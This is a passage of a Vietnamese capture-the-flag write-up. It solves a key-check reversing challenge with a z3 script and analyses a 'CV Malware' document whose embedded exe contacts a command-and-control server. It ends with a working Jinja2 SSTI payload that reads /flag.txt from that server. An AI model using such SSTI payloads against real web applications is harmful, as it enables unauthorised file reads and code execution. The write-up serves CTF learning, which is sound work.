  if ( 749 * a1[13]
     + 297 * a1[12]
     + 346 * a1[9]
     + 378 * a1[8]
     + 70 * a1[5]
     + 504 * a1[3]
     + 840 * a1[2]
     + 451 * a1[1]
     + 110 * *a1
     - 855 * a1[4]
     - 367 * a1[6]
     - 766 * a1[7]
     - 806 * a1[10]
     - 400 * a1[11] != 10699
    || 644 * a1[12]
     + 377 * a1[11]
     + 418 * a1[10]
     + 545 * a1[6]
     + 338 * a1[5]
     + 570 * a1[3]
     + 705 * a1[2]
     + 946 * a1[1]
     + 42 * *a1
     - 977 * a1[4]
     - 764 * a1[7]
     - 223 * a1[8]
     - 879 * a1[9]
     - 100 * a1[13] != 61677
    || 725 * a1[13]
     + 899 * a1[12]
     + 55 * a1[10]
     + 610 * a1[9]
     + 299 * a1[6]
     + 234 * a1[4]
     + 809 * a1[3]
     + 972 * a1[2]
     + 973 * a1[1]
     + 808 * *a1
     - 26 * a1[5]
     - 46 * a1[7]
     - 823 * a1[8]
     - 164 * a1[11] != 417944
    || 80 * a1[13]
     + 225 * a1[11]
     + 640 * a1[10]
     + 21 * a1[8]
     + 910 * a1[7]
     + 721 * a1[5]
     + 102 * *a1
     - 969 * a1[1]
     - 192 * a1[2]
     - 189 * a1[3]
     - 157 * a1[4]
     - 665 * a1[6]
     - 334 * a1[9]
     - 296 * a1[12] != 27876
    || 992 * a1[12]
     + 621 * a1[11]
     + 151 * a1[10]
     + 340 * a1[8]
     + 601 * a1[5]
     + 138 * a1[1]
     + 749 * *a1
     - 341 * a1[2]
     - 140 * a1[3]
     - 569 * a1[4]
     - 646 * a1[6]
     - 474 * a1[7]
     - 406 * a1[9]
     - 491 * a1[13] != 86237
    || 962 * a1[13]
     + 523 * a1[11]
     + 655 * a1[9]
     + 153 * a1[5]
     + 120 * a1[3]
     + 579 * a1[2]
     + 70 * *a1
     - 735 * a1[1]
     - 238 * a1[4]
     - 197 * a1[6]
     - 235 * a1[7]
     - 174 * a1[8]
     - 101 * a1[10]
     - 327 * a1[12] != 124555
    || 609 * a1[11]
     + 938 * a1[10]
     + 961 * a1[6]
     + 949 * a1[2]
     + 702 * a1[1]
     + 612 * *a1
     - 467 * a1[3]
     - 8 * a1[4]
     - 336 * a1[5]
     - 996 * a1[7]
     - 88 * a1[8]
     - 412 * a1[9]
     - 383 * a1[12]
     - 359 * a1[13] != 99472
    || 691 * a1[13]
     + 733 * a1[12]
     + 988 * a1[10]
     + 313 * a1[9]
     + 51 * a1[6]
     + 170 * a1[5]
     + 892 * a1[4]
     + 36 * a1[3]
     + 179 * *a1
     - 99 * a1[1]
     - 224 * a1[2]
     - 286 * a1[7]
     - 317 * a1[8]
     - 332 * a1[11] != 248916
    || 441 * a1[13]
     + 587 * a1[12]
     + 938 * a1[11]
     + 972 * a1[10]
     + 321 * a1[7]
     + 929 * a1[4]
     + 220 * a1[3]
     + 211 * a1[2]
     + 277 * a1[1]
     + 258 * *a1
     - 860 * a1[5]
     - 237 * a1[6]
     - 412 * a1[8]
     - 694 * a1[9] != 284272
    || 387 * a1[13]
     + 437 * a1[12]
     + 548 * a1[11]
     + 86 * a1[10]
     + 527 * a1[6]
     + 48 * a1[5]
     + 135 * a1[3]
     + 773 * a1[1]
     + 964 * *a1
     - 169 * a1[2]
     - 230 * a1[4]
     - 976 * a1[7]
     - 148 * a1[8]
     - 716 * a1[9] != 137743
    || 438 * a1[12]
     + (a1[9] << 9)
     + 547 * a1[8]
     + 385 * a1[2]
     + 343 * a1[1]
     + 598 * *a1
     - 774 * a1[3]
     - 579 * a1[4]
     - 9 * a1[5]
     - 883 * a1[6]
     - 419 * a1[7]
     - 869 * a1[10]
     - 86 * a1[11]
     - 924 * a1[13] != -116586
    || 549 * a1[13]
     + 532 * a1[11]
     + 21 * a1[9]
     + 883 * a1[8]
     + 99 * a1[7]
     + 982 * a1[3]
     + 557 * a1[2]
     + 690 * a1[1]
     + 163 * *a1
     - 154 * a1[4]
     - 118 * a1[5]
     - 672 * a1[6]
     - 953 * a1[10]
     - 562 * a1[12] != 141428
    || 379 * a1[9]
     + 460 * a1[5]
     + 607 * a1[2]
     + 339 * a1[1]
     + 337 * *a1
     - 391 * a1[3]
     - 684 * a1[4]
     - 341 * a1[6]
     - 757 * a1[7]
     - 557 * a1[8]
     - 887 * a1[10]
     - 178 * a1[11]
     - 660 * a1[12]
     - 718 * a1[13] != -267187
    || 20 * a1[12]
     + 761 * a1[11]
     + 616 * a1[10]
     + 162 * a1[8]
     + 593 * a1[7]
     + 925 * a1[6]
     + 603 * a1[3]
     + 131 * a1[2]
     + 149 * a1[1]
     + 682 * *a1
     - 119 * a1[4]
     - 737 * a1[5]
     - 637 * a1[9]
     - 277 * a1[13] != 247270 )
  {
    return 0;
  }
  v1 = strlen((const char *)a1) + 1;
  retaddr = 0;
  do
  {
    byte_2E50B01[retaddr] ^= a1[retaddr % (int)(v1 - 1)];
    ++retaddr;
  }
  while ( (unsigned int)retaddr < 0x8D42 );
  ((void (__cdecl *)(_BYTE *))((char *)NtCurrentPeb()->ImageBaseAddress + 7872))(byte_2E50B01);
  return 1;
}
```
Có một đoạn check dài được thực hiện, dễ thấy ở đây chính là hệ phương trình từ các phần tử của mảng. Để tìm lại `a1` thỏa mãn, ta sẽ dùng z3

```python
from z3 import *

a1 = [BitVec(f"c{i:02}", 16) for i in range(14)]

s = Solver()

s.add((749 * a1[13] + 297 * a1[12] + 346 * a1[9] + 378 * a1[8] + 70 * a1[5] + 504 * a1[3] + 840 * a1[2] +
      451 * a1[1] + 110 * a1[0] - 855 * a1[4] - 367 * a1[6] - 766 * a1[7] - 806 * a1[10] - 400 * a1[11]) == 10699)
s.add((644 * a1[12] + 377 * a1[11] + 418 * a1[10] + 545 * a1[6] + 338 * a1[5] + 570 * a1[3] + 705 * a1[2] +
      946 * a1[1] + 42 * a1[0] - 977 * a1[4] - 764 * a1[7] - 223 * a1[8] - 879 * a1[9] - 100 * a1[13]) == 61677)
s.add((725 * a1[13] + 899 * a1[12] + 55 * a1[10] + 610 * a1[9] + 299 * a1[6] + 234 * a1[4] + 809 * a1[3] +
      972 * a1[2] + 973 * a1[1] + 808 * a1[0] - 26 * a1[5] - 46 * a1[7] - 823 * a1[8] - 164 * a1[11]) == 417944)
s.add((80 * a1[13] + 225 * a1[11] + 640 * a1[10] + 21 * a1[8] + 910 * a1[7] + 721 * a1[5] + 102 * a1[0] -
      969 * a1[1] - 192 * a1[2] - 189 * a1[3] - 157 * a1[4] - 665 * a1[6] - 334 * a1[9] - 296 * a1[12]) == 27876)
s.add((992 * a1[12] + 621 * a1[11] + 151 * a1[10] + 340 * a1[8] + 601 * a1[5] + 138 * a1[1] + 749 * a1[0] -
      341 * a1[2] - 140 * a1[3] - 569 * a1[4] - 646 * a1[6] - 474 * a1[7] - 406 * a1[9] - 491 * a1[13]) == 86237)
s.add((962 * a1[13] + 523 * a1[11] + 655 * a1[9] + 153 * a1[5] + 120 * a1[3] + 579 * a1[2] + 70 * a1[0] -
      735 * a1[1] - 238 * a1[4] - 197 * a1[6] - 235 * a1[7] - 174 * a1[8] - 101 * a1[10] - 327 * a1[12]) == 124555)
s.add((609 * a1[11] + 938 * a1[10] + 961 * a1[6] + 949 * a1[2] + 702 * a1[1] + 612 * a1[0] - 467 * a1[3] -
      8 * a1[4] - 336 * a1[5] - 996 * a1[7] - 88 * a1[8] - 412 * a1[9] - 383 * a1[12] - 359 * a1[13]) == 99472)
s.add((691 * a1[13] + 733 * a1[12] + 988 * a1[10] + 313 * a1[9] + 51 * a1[6] + 170 * a1[5] + 892 * a1[4] +
      36 * a1[3] + 179 * a1[0] - 99 * a1[1] - 224 * a1[2] - 286 * a1[7] - 317 * a1[8] - 332 * a1[11]) == 248916)
s.add((441 * a1[13] + 587 * a1[12] + 938 * a1[11] + 972 * a1[10] + 321 * a1[7] + 929 * a1[4] + 220 * a1[3] +
      211 * a1[2] + 277 * a1[1] + 258 * a1[0] - 860 * a1[5] - 237 * a1[6] - 412 * a1[8] - 694 * a1[9]) == 284272)
s.add((387 * a1[13] + 437 * a1[12] + 548 * a1[11] + 86 * a1[10] + 527 * a1[6] + 48 * a1[5] + 135 * a1[3] +
      773 * a1[1] + 964 * a1[0] - 169 * a1[2] - 230 * a1[4] - 976 * a1[7] - 148 * a1[8] - 716 * a1[9]) == 137743)
s.add((438 * a1[12] + (a1[9] * 2 ** 9) + 547 * a1[8] + 385 * a1[2] + 343 * a1[1] + 598 * a1[0] - 774 * a1[3] -
      579 * a1[4] - 9 * a1[5] - 883 * a1[6] - 419 * a1[7] - 869 * a1[10] - 86 * a1[11] - 924 * a1[13]) == -116586)
s.add((549 * a1[13] + 532 * a1[11] + 21 * a1[9] + 883 * a1[8] + 99 * a1[7] + 982 * a1[3] + 557 * a1[2] +
      690 * a1[1] + 163 * a1[0] - 154 * a1[4] - 118 * a1[5] - 672 * a1[6] - 953 * a1[10] - 562 * a1[12]) == 141428)
s.add((379 * a1[9] + 460 * a1[5] + 607 * a1[2] + 339 * a1[1] + 337 * a1[0] - 391 * a1[3] - 684 * a1[4] - 341 *
      a1[6] - 757 * a1[7] - 557 * a1[8] - 887 * a1[10] - 178 * a1[11] - 660 * a1[12] - 718 * a1[13]) == -267187)
s.add((20 * a1[12] + 761 * a1[11] + 616 * a1[10] + 162 * a1[8] + 593 * a1[7] + 925 * a1[6] + 603 * a1[3] +
      131 * a1[2] + 149 * a1[1] + 682 * a1[0] - 119 * a1[4] - 737 * a1[5] - 637 * a1[9] - 277 * a1[13]) == 247270)

print(s.check())

m = s.model()
sol = sorted([(d, m[d]) for d in m], key=lambda x: str(x[0]))
key = ''.join([chr(int(str(c))) for _, c in sol])
print(key)
# q20OK36QBiWkZT
```

Lấy key được in ra nhập vào ứng dụng và lấy flag thôi.

![](https://hackmd.io/_uploads/S1w_2jKtn.png)

#### Flag
`CHH{C00k13_4R3n4}`

### CV Malware
**Difficulty:** <span style="color: orange">Medium</span>

Bài này thì ngược lại với bài Pass Code :v Web trá hình

#### Cách giải
Exiftool thử file doc thì thấy `subject` với `description` khá đáng nghi

![](https://hackmd.io/_uploads/ByA5JhKt3.png)

Decode `subject` thì ra nội dung giống của 1 file .yaml
```yaml
server:
   host: http://REPLACE_HOST_HERE
   secret: SecR3TtOKen
```

Decode `description` thì ra 1 file exe
Dùng IDA để reverse file đó thì thấy nó có gửi request đến server.

![](https://hackmd.io/_uploads/BJOIg3FF3.png)

Thử nhập đường link đó qua web site với host tự tạo thì thấy có tải về 1 file tên là `client.exe`

Tiếp tục mở file đó bằng IDA

![](https://hackmd.io/_uploads/rk74-nYKh.png)

Có vẻ như exe được viết bằng golang vì có hàm `main_main` (giống `main` trong C)

Trong hàm đó có gọi một hàm đó chính là `main_sendPostRequest`
Check hàm đó thử thì thấy nó set Header cho post request

![](https://hackmd.io/_uploads/rkvTZhYF3.png)

`Content-Type: application/json`

![](https://hackmd.io/_uploads/HJhyMhYKh.png)

`Secret: SecR3TtOKen` (hàm `MIMEHeaderKey` lấy key từ subject)

Ngoài ra nó còn load tất cả file `.ini` nữa (ở trong hàm `main_loadAllConfigs`)

![](https://hackmd.io/_uploads/SkgQLnKKn.png)

Để nhanh thì mình tạo file `config.ini` và copy cái subject được decode vào và chạy exe. Trong lúc đó thì mình bật wireshark để bắt gói tin xem nó gửi data kiểu gì 

![](https://hackmd.io/_uploads/H1UMv2FY2.png)

Khúc này tác giả có hint rằng `FLAG nằm trên host, tìm cách kết nối đúng và exploit`

Vậy phải tìm cách exploit trang web của hacker.
-> Lúc này là chuyển qua mảng web :v

Thử tạo lại request bằng [Postman](https://www.postman.com/) thì server trả về như sau

![](https://hackmd.io/_uploads/rJ05w3tKn.png)

Sau một hồi thử nhiều thứ thì mình thấy rằng `{% raw %}{{7 * 7}}{% endraw %}` trả về 49 -> **SSTI**

![](https://hackmd.io/_uploads/B1akdhYF2.png)

Đoán rằng đây là jinja2 mình mượn payload có sẵn ở trên mạng để thử RCE và kết quá là lấy được flag

```
{% raw %}{{url_for.__globals__.__builtins__.open('/flag.txt').read()}}{% endraw %}
```

![](https://hackmd.io/_uploads/HkbBO3FYn.png)


#### Flag
`CHH{ExtR@Ct_m4CRo_aNd_h@Ck_C2c_d37770e38c3d1079f03939f97951f72a}`